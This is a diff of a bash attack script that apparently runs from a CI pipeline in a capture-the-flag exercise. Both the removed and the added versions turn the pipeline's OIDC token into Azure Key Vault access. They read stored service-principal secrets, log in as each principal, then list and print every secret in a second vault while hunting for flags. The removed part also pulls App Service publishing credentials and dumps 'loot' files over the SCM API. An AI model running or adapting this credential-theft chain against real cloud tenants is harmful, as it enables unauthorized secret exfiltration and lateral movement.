@@ -1,36 +1,47 @@
 #!/usr/bin/env bash
 set -uo pipefail
-M="--max-time 25 --connect-timeout 10"
-SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
-RAPP="/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
-SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
-MGMT="https://management.azure.com"; API=2022-03-01
+M="--max-time 30 --connect-timeout 10"
+PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"
+SECKV="https://kv-tbl-sec-x3euoz.vault.azure.net"
 
 OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
 KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
-J=$(curl -sS $M -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r '.value')
-RS=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$(echo "$J"|jq -r .appId)" -d "client_secret=$(echo "$J"|jq -r .clientSecret)" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
-PUB=$(curl -sS $M -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "$MGMT$RAPP/config/publishingcredentials/list?api-version=$API")
-U=$(echo "$PUB"|jq -r '.properties.publishingUserName'); P=$(echo "$PUB"|jq -r '.properties.publishingPassword')
-A="-u $U:$P"
-echo "creds ok passlen=${#P}"
+echo "pipeline vault token len=${#KV}"
 
-dir="site/wwwroot"
-echo "===== grepping every file in $dir for DF26{ ====="
-NAMES=$(curl -sS $M $A "$SCM/api/vfs/$dir/" 2>/dev/null | jq -r '.[]? | select(.mime!="inode/directory") | .name')
-HIT=0
-while IFS= read -r n; do
-  [ -z "$n" ] && continue
-  body=$(curl -sS $M $A "$SCM/api/vfs/$dir/$(printf '%s' "$n" | sed 's/ /%20/g')" 2>/dev/null | head -c 40000)
-  m=$(printf '%s' "$body" | grep -aoE "DF26\{[^}]{0,120}\}" | sort -u)
-  if [ -n "$m" ]; then echo ">>> FLAG in $n:"; echo "$m"; HIT=1; fi
-done <<< "$NAMES"
-echo "grep_done hits=$HIT"
+# try reading all of kv-tbl-sec with a given vault token; grep DF26 in values
+probe_sec () {
+  local label="$1" tok="$2"
+  [ -z "$tok" ] && { echo "[$label] NO TOKEN"; return; }
+  local list; list=$(curl -sS $M -H "Authorization: Bearer $tok" "$SECKV/secrets?api-version=7.4&maxresults=25")
+  local code; code=$(printf '%s' "$list" | jq -r 'if .error then "ERR:"+.error.code else "OK" end' 2>/dev/null)
+  if [ "$code" != "OK" ]; then echo "[$label] kv-tbl-sec list -> $(printf '%s' "$list" | jq -c '.error' 2>/dev/null | head -c 160)"; return; fi
+  echo "[$label] kv-tbl-sec LIST OK:"
+  local ids; ids=$(printf '%s' "$list" | jq -r '.value[]?.id')
+  echo "$ids" | sed 's/^/   /'
+  while IFS= read -r sid; do
+    [ -z "$sid" ] && continue
+    local v; v=$(curl -sS $M -H "Authorization: Bearer $tok" "$sid?api-version=7.4" | jq -r '.value // empty')
+    echo "   VAL $sid = $v"
+    printf '%s' "$v" | grep -aoE "DF26\{[^}]*\}" && echo "   *** FLAG ABOVE ***"
+  done <<< "$ids"
+}
 
-echo; echo "===== dump high-value loot files verbatim ====="
-for f in .flag.out ctf_flag_result flag_result.txt df26grep.txt results.json tnex_flag.json zz_probe_result.json flaghunt_out.json myres.txt msi_probe.txt mitok.json mi_dump.json mi_out.json identity_probe.json g_out1.txt; do
-  echo "----- $f -----"
-  curl -sS $M $A "$SCM/api/vfs/$dir/$f" 2>/dev/null | head -c 2500
-  echo
+echo "=== pipeline SP vs kv-tbl-sec ==="
+probe_sec "pipeline" "$KV"
+
+for name in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
+  J=$(curl -sS $M -H "Authorization: Bearer $KV" "$PRODKV/secrets/$name?api-version=7.4" | jq -r '.value // empty')
+  [ -z "$J" ] && { echo "=== $name: could not read principal secret ==="; continue; }
+  appId=$(printf '%s' "$J" | jq -r '.appId // .clientId // .client_id // .appid // empty' 2>/dev/null)
+  sec=$(printf '%s'   "$J" | jq -r '.clientSecret // .password // .secret // .client_secret // empty' 2>/dev/null)
+  ten=$(printf '%s'   "$J" | jq -r '.tenant // .tenantId // .tenant_id // empty' 2>/dev/null)
+  [ -z "$ten" ] && ten=$AZURE_TENANT_ID
+  if [ -z "$appId" ] || [ -z "$sec" ]; then
+    echo "=== $name: shape not {appId,clientSecret}; raw keys: $(printf '%s' "$J" | jq -rc 'keys' 2>/dev/null) ==="
+    continue
+  fi
+  tok=$(curl -sS $M -X POST "https://login.microsoftonline.com/$ten/oauth2/v2.0/token" -d "client_id=$appId" -d "client_secret=$sec" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
+  echo "=== $name (appId=$appId) vault-token len=${#tok} ==="
+  probe_sec "$name" "$tok"
 done
-echo "LOOT DONE"; exit 0
+echo "KVSEC DONE"; exit 0
